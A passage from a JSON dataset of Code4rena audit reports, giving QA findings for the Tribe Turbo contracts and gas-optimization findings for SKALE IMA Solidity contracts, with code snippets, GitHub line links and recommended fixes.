deployment.\n\nhttps://github.com/fei-protocol/tribe-turbo/blob/5e1c5d9b49dc557c84f07afabbba2ba4e08e9cc6/src/modules/TurboBooster.sol#L100-L113\n\n```solidity\n    function canSafeBoostVault(\n        TurboSafe safe,\n        ERC20 collateral,\n        ERC4626 vault,\n        uint256 feiAmount,\n        uint256 newTotalBoostedForVault,\n        uint256 newTotalBoostedAgainstCollateral\n    ) external view returns (bool) {\n        return\n            !frozen &&\n            getBoostCapForVault[vault] >= newTotalBoostedForVault &&\n            getBoostCapForCollateral[collateral] >= newTotalBoostedAgainstCollateral;\n    }\n}\n```\n\n`safe`, `feiAmount` is unused.",
    "dataSource": {
      "name": "code-423n4/2022-02-tribe-turbo-findings",
      "repo": "https://github.com/code-423n4/2022-02-tribe-turbo-findings",
      "url": "https://github.com/code-423n4/2022-02-tribe-turbo-findings/issues/52"
    }
  },
  {
    "title": "QA Report",
    "body": "\n## [L-01] Remove Optimized Unchecked Operations\n\n**Severity**: _Medium_\n**Likelihood**: _Low_\n**Status**: {Not Submitted}\n**Scopes**\n- [`TurboSafe:boost()`](https://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboSafe.sol#L180-L186)\n- [`TurboSafe:less()`](https://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboSafe.sol#L211-L218)\n- [`TurboSafe:slurp()`](https://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboSafe.sol#L275-L281)\n- [`TurboMaster:onSafeBoost()`](https://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboMaster.sol#L210-L229)\n- [`TurboMaster:onSafeLess()`](https://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboMaster.sol#L260-L272)\n- [`TurboMaster:onSafeSlurp()`](https://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboMaster.sol#L290-L301)\n\nUnchecked operations on balance state variables expose attack surfaces to create inconsistent state. Consider enforcing safe arithmetic by removing the unchecked gas optimizations.\n\n\n## [L-02] Inconsistent Fee Percent Denomination\n\n**Severity**: _Medium_\n**Likelihood**: _Low_\n**Status**: {Not Submitted}\n**Scope**: [`TurboClerk`](https://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/modules/TurboClerk.sol)\n\nThe fee percent managed by clerk is denominated with `1e18` decimals. But when the fee is used by composed modules, it expects the `vault`'s `asset` to use a `WAD` denomination (as used in [`FixedPointMathLib`](https://github.com/Rari-Capital/solmate/blob/1205a9067ff957ef8b0b003ff9d77c20ef9f2e0b/src/utils/FixedPointMathLib.sol)).\n\nThis works for `fei` calculations, but `TurboSafe` accepts any `ERC20` compliant asset. Thus, ERC20s can effectively avoid Turbo fees by specifying a large decimal count.\n\nRecommendation: `TurboClerk` should denominate safe and collateral fee percents in the ERC20 decimal count instead of using an upper bounds of 1e18.\n\n\n## [L-04] Extend TurboRouter Authentication\n\n**Severity**: _Low_\n**Likelihood**: _Low_\n**Status**: {Not Submitted}\n**Scope**: [`TurboRouter:authenticate`](https://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboRouter.sol#L37-L41)\n\n`TurboRouter` authenticates `TurboSafe` interactions solely by the safe's authority owner rather than permissioning on the canonical _canCall_ Authority pattern [defined in solmate](https://github.com/Rari-Capital/solmate/blob/1205a9067ff957ef8b0b003ff9d77c20ef9f2e0b/src/auth/Auth.sol#L35). The `authenticate` modifier could accept a function signature to validate if the sender can call the function (signature) on the given `target`.\n\n![TurboRouter Authenticate Modifier](https://i.imgur.com/VeICnNq.png)\n\n**Recommendation**: Authenticate on owner _or_ if the `msg.sender` can call the given function (signature).",
    "dataSource": {
      "name": "code-423n4/2022-02-tribe-turbo-findings",
      "repo": "https://github.com/code-423n4/2022-02-tribe-turbo-findings",
      "url": "https://github.com/code-423n4/2022-02-tribe-turbo-findings/issues/44"
    }
  },
  {
    "title": "QA report",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboSafe.sol#L311-312\n\n\n# Vulnerability details\n\n## Impact\n\nVault shares and collateral cTokens might be accessed with `sweep` if a cToken have more than one address.\n\nThis will disturb the system accounting. The tokens caller obtained will be at a loss for other safe users who will not be able to receive Fei they own per contract records.\n\nThis is a fund loss scenario, but the probability is low as such tokens are rare, so setting severity to medium\n\n## Proof of Concept\n\nTurboSafe.sweep controls for one vault and one cTokens address, allowing for sweeping everything else:\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboSafe.sol#L311-312\n\nSome ERC20 have more than one address they can be operated with:\n\nhttps://github.com/d-xo/weird-erc20#multiple-token-addresses\n\n## Recommended Mitigation Steps\n\nAs address control is used consider providing the ability to input a list of asset addresses to prohibit operations with\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-tribe-turbo-findings",
      "repo": "https://github.com/code-423n4/2022-02-tribe-turbo-findings",
      "url": "https://github.com/code-423n4/2022-02-tribe-turbo-findings/issues/41"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "Gas opt\n\n#1 Using 1 modifier to check ROLE\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/MessageProxy.sol#L116-L135\ncurrently this contract is using 3 modifier to check which address is validated to run the function. Just use 1 modifier and pass which role \nwill run the function then pass the address into the modifier argument:\n```\nmodifier onlyRole(bytes32 _role) {\n        require(hasRole(_role, msg.sender), \"ROLE is required\");\n        _;\n    }\n//then run the function:\nfunction foo(bytes) onlyRole(anyRole){}\n```\n\n#2 Using && spend more gashttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBox.sol#L77-L81\ninstead of using &&, using multiple `require` check can save execution gas fee:\n```\nrequire(\n            schainHash != keccak256(abi.encodePacked(\"Mainnet\")),\n            \"Receiver chain is incorrect\"\n        );\nrequire(\n            sender == schainLinks[schainHash],\n            \"Receiver chain is incorrect\"\n        );\n```\n#3 Using new private function to validate `connectedChains[value].inited`\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/MessageProxy.sol#L240\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/MessageProxy.sol#L258\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/MessageProxy.sol#L291\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/MessageProxy.sol#L315\ncreate a new private function to run:\n```\nrequire(connectedChains[value].inited, \"Error\");\n```\nthan call the code 4 times can save 18.018 gas when deploying the contract:\n```\n function _foo(string memory _x)private view{\n\trequire(connectedChains[_x].inited, \"error\");\n}\n function removeConnectedChain(string memory schainName) public virtual override onlyChainConnector {\n        bytes32 schainHash = keccak256(abi.encodePacked(schainName));\n        _foo(schainName);\n        delete connectedChains[schainHash];\n    }    \n```\n\n#4 better increment for saving more gas\n\nPrefix increment are cheaper than postfix increment, its a common that using ++i instead i++ for compiler ^0.8.* .So \nthis f() are not using prefix increments (++i) or using the unchecked (++i). \t\n\nit can be seen from here : https://github.com/code-423n4/2022-01-xdefi-findings/issues/9 and \n\nOccurance :\n```\nblob/main/contracts/schain/TokenManagers/TokenManagerERC1155.sol \t#L500, #L514 \nblob/main/contracts/schain/MessageProxyForSchain.sol  \t\t\t#L118, #L222 \nblob/main/contracts/schain/TokenManagerLinker.sol\t\t\t#L151, #L166, #L192\t\t\nblob/main/contracts/MessageProxy.sol\t\t\t\t\t#L221, #L515\nblob/main/contracts/mainnet/Linker.sol\t\t\t\t\t#L100, #L149, #L175\nblob/main/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol\t\t#L76, #L276\nblob/main/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol\t\t#L76, #L260\nblob/main/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol\t\t#L79, #L275, #L398, #L444, #L459\n```\n\n\n\n#5 state variables that could be set as immutable\n\nthe `erc721ContractOnSchain` & `receiverContractOnMainnet` could be set as `immutable` to save more gas\n\nOccurance :\n```\nblob/main/contracts/extensions/ERC721ReferenceMintAndMetadataSchain.sol #L34-35\nblob/main/contracts/extensions/ERC721ReferenceMintAndMetadataMainnet.sol #L34\n```\n#6 Custom errors from Solidity 0.8.4 are cheaper than revert strings.\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/MessageProxy.sol#L173\ninstead of using string to revert the error message, use `error` to declare the custom error, then replace the revert string with it.\n```\nerror errorMessage();\n```\n\n#7 using ++var instead += 1\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/MessageProxy.sol#L302\nchange l 302 to:\n```\n++connectedChains[targetChainHash].outgoingMessageCounter;\n```\n#8 Using `storage` can save gas\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/Messages.sol#L208\ninstead of caching `message` in memory, read it from `storage` can save gas. The `message` var is just called once inl L 213\n```\n TransferEthMessage storage message = TransferEthMessage(\n            BaseMessage(MessageType.TRANSFER_ETH),\n            receiver,\n            amount\n        );\n```\n\n#9 unnecessary `length` declaration\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/Linker.sol#L173\n`length` var is just used once in the L 175. Its unnecessary to chace it in memory. Remove the line and call `_mainnetContracts.length()`\ndirectly:\n```\nfor (uint i = 0; connected && i <  _mainnetContracts.length(); i++)\n``` \n\n#10 Dont set uint i = 0\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/MessageProxyForMainnet.sol#L118\nby just declaring `uint i;` without set the value = 0 can save deployment gas fee. Do it on all `for()` loop\n\n#11 Set the default value on vars declaration\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/MessageProxyForMainnet.sol#L73-L74 \nby setting the value of `headerMessageGasCost` and `messageGasCost` on their declaration, can save gas without\nwriting storage in `initialize()`:\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/MessageProxyForMainnet.sol#L298-L299\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/75"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "### Using `bool`s for storage incurs overhead\n```\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\n```solidity\nmapping(bytes32 => mapping(address => bool)) internal deprecatedRegistryContracts;         \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L60\n\n```solidity\nmapping(bytes32 => mapping(address => bool)) private _deprecatedSchainToERC20;         \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L44\n\n```solidity\nmapping(bytes32 => bool) public activeEthTransfers;           \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L43\n\n```solidity\nmapping(bytes32 => mapping(address => bool)) private _deprecatedSchainToERC1155;         \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L47\n\n```solidity\nmapping(bytes32 => mapping(address => bool)) private _deprecatedSchainToERC721;         \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L44\n\n```solidity\nmapping(bytes32 => bool) private _interchainConnections;           \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L47\n\n```solidity\nbool public override messageInProgress;            \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L77\n\n```solidity\nmapping(bytes32 => bool) private _automaticDeploy;           \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBox.sol#L39\n\n```solidity\nmapping(address => mapping(bytes32 => bool)) public activeUsers;         \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/CommunityPool.sol#L47\n\n### `abi.encode()` is less efficient than `abi.encodePacked()`\n```solidity\ndata = abi.encode(receiver, tokenId, tokenURI);           \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/extensions/ERC721ReferenceMintAndMetadataSchain.sol#L72\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L213\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L240\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L261\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L309\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L341\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L374\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L426\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L459\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L494\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L528\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L566\n\n```solidity\nreturn abi.encode(message);              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L593\n\n\n### `require()` strings longer than 32 bytes cost extra gas\n```solidity\nrequire(hasRole(EXTRA_CONTRACT_REGISTRAR_ROLE, msg.sender), \"EXTRA_CONTRACT_REGISTRAR_ROLE is required\");                   \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L125\n\n```solidity\nrequire(hasRole(CONSTANT_SETTER_ROLE, msg.sender), \"Not enough permissions to set constant\");                \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L133\n\n```solidity\nrequire(!_getRegistryContracts()[bytes32(0)].contains(extraContract), \"Extra contract is already registered\");                  \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L174\n\n```solidity\nrequire(connectedChains[dstChainHash].inited, \"Destination chain is not initialized\");                  \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L240\n\n```solidity\nrequire(connectedChains[targetChainHash].inited, \"Destination chain is not initialized\");                  \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L291\n\n```solidity\nrequire(!_getRegistryContracts()[chainHash].contains(extraContract), \"Extra contract is already registered\");                  \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L365\n\n```solidity\n\"Extra contract is already registered for all chains\"                \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L368\n\n```solidity\n\"Destination contract is not a contract\"                  \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L426\n\n```solidity\n\"Sender contract is not registered\"                   \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L489\n\n```solidity\n\"DepositBox was not approved for ERC20 token\"                 \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L110\n\n```solidity\n\"Not enough money to finish this transaction\"                 \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L102\n\n```solidity\n\"DepositBox was not approved for ERC1155 token\"                 \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L114\n\n```solidity\n\"DepositBox was not approved for ERC1155 token Batch\"                \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L156\n\n```solidity\nreturn bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"));                      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L333\n\n```solidity\nreturn bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"));                      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L352\n\n```solidity\n\"DepositBox was not approved for ERC721 token\"                 \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L107\n\n```solidity\nrevert(\"Already killed or incorrect sender\");                   \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L135\n\n```solidity\nrequire(address(newCommunityPoolAddress) != address(0), \"CommunityPool address has to be set\");               \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L152\n\n```solidity\n\"Not enough permissions to register extra contract\"                 \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L169\n\n```solidity\nrequire(schainHash != MAINNET_HASH, \"Schain hash can not be equal Mainnet\");              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L171\n\n```solidity\n\"Not enough permissions to register extra contract\"                 \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L189\n\n```solidity\nrequire(schainHash != MAINNET_HASH, \"Schain hash can not be equal Mainnet\");              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L191\n\n```solidity\nrequire(_checkSchainBalance(fromSchainHash), \"Schain wallet has not enough funds\");                 \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L217\n\n```solidity\n\"Starting counter is not equal to incoming message counter\");               \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L222\n\n```solidity\nrequire(keccak256(abi.encodePacked(schainName)) != MAINNET_HASH, \"Schain id can not be equal Mainnet\");              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L320\n\n```solidity\n\"Sender contract is not registered\"                   \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L331\n\n```solidity\n\"SKALE chain name cannot be Mainnet\"                  \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBox.sol#L66\n\n```solidity\nrequire(contractReceiver != address(0), \"Incorrect address of contract receiver on Schain\");              \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Twin.sol#L66\n\n```solidity\n\"../schain/tokens/ERC721OnChain.sol\";                       \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/extensions/ERC721ReferenceMintAndMetadataMainnet.sol#L26#Limport\n\n```solidity\n\"../schain/tokens/ERC721OnChain.sol\";                       \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/extensions/ERC721ReferenceMintAndMetadataSchain.sol#L26#Limport\n\n```solidity\nrequire(getMessageType(data) == MessageType.TRANSFER_ERC20, \"Message type is not ERC20 transfer\");               \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L270\n\n```solidity\n\"Message type is not ERC20 transfer and total supply\"               \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L283\n\n```solidity\n\"Message type is not ERC20 transfer with token info\"               \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L321\n\n```solidity\nrequire(getMessageType(data) == MessageType.TRANSFER_ERC721, \"Message type is not ERC721 transfer\");               \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L351\n\n```solidity\n\"Message type is not ERC721 transfer with token info\"               \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L386\n\n```solidity\nrequire(getMessageType(data) == MessageType.INTERCHAIN_CONNECTION, \"Message type is not Interchain connection\");               \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L438\n\n```solidity\nrequire(getMessageType(data) == MessageType.TRANSFER_ERC1155, \"Message type is not ERC1155 transfer\");               \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L469\n\n```solidity\n\"Message type is not ERC1155AndTokenInfo transfer\"                  \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L506\n\n```solidity\n\"Message type is not ERC1155Batch transfer\"                  \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L540\n\n```solidity\n\"Message type is not ERC1155BatchAndTokenInfo transfer\"                  \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L578\n\n### Using `> 0` costs more gas than `!= 0` when used on uints in a `require()` statement\n```solidity\nrequire(approveTransfers[msg.sender] > 0, \"User has insufficient ETH\");         \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L122\n\n### `<array>.length` should not be looked up in every loop of a for-loop\nEven memory arrays incur the overhead of bit tests and bit shifts to calculate the array length\n```solidity\nfor (uint256 i = 0; i < messages.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L515\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L76\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L79\n\n```solidity\nfor (uint256 i = 0; i < ids.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L275\n\n```solidity\nfor (uint256 i = 0; i < ids.length; i++)       \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L444\n\n```solidity\nfor (uint256 i = 0; i < ids.length; i++)       \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L459\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L76\n\n```solidity\nfor (uint i = 0; i < schainContracts.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L100\n\n```solidity\nfor (uint i = 0; i < length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L149\n\n```solidity\nfor (uint i = 0; connected && i < length; i++) {    \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L175\n\n```solidity\nfor (uint256 i = 0; i < contracts.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L118\n\n```solidity\nfor (uint256 i = 0; i < messages.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L235\n\n\n### `++i`/`i++` should be `unchecked{++i}`/`unchecked{++i}` when it is not possible for them to overflow, as is the case when used in for- and while-loops\n```solidity\nfor (uint256 i = from; i < to; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L221\n\n```solidity\nfor (uint256 i = 0; i < messages.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L515\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L76\n\n```solidity\nfor (uint256 i = from; i < to; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L276\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L79\n\n```solidity\nfor (uint256 i = 0; i < ids.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L275\n\n```solidity\nfor (uint256 i = from; i < to; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L398\n\n```solidity\nfor (uint256 i = 0; i < 